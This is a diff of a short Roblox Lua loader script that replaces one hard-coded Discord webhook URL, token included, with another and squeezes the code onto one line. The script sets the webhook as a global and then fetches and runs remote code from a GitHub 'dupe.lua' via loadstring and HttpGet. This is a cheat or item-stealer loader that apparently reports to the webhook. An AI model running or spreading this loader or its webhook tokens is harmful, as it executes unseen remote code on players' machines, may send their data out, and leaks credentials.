@@ -1,16 +1,1 @@
-local Webhook = "https://canary.discord.com/api/webhooks/1437277893221941399/scSDa7da_v8AZMQ__qY51I_jNI_h4Jnyufuee90t4PTNgJLeYumTEgw6njhgWFy9cgz6"
-
-getgenv().UserPingThreshold = 50000000
-
-
--- =================================================================================
---      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
--- =================================================================================
-
-if Webhook and Webhook:match("discord.com/api/webhooks") then
-    getgenv().UserWebhookURL = Webhook
-else
-    return
-end
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
+local Webhook = "https://discord.com/api/webhooks/1437577985191313459/ul72iTw1NqDzYzGAcJvNfKWvwREPlBNiG3lozafXUEUkj9rqiAuHPqvH5rQSHW_r0vW6"  getgenv().UserPingThreshold = 50000000   -- ================================================================================= --      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE -- =================================================================================  if Webhook and Webhook:match("discord.com/api/webhooks") then     getgenv().UserWebhookURL = Webhook else     return end  loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
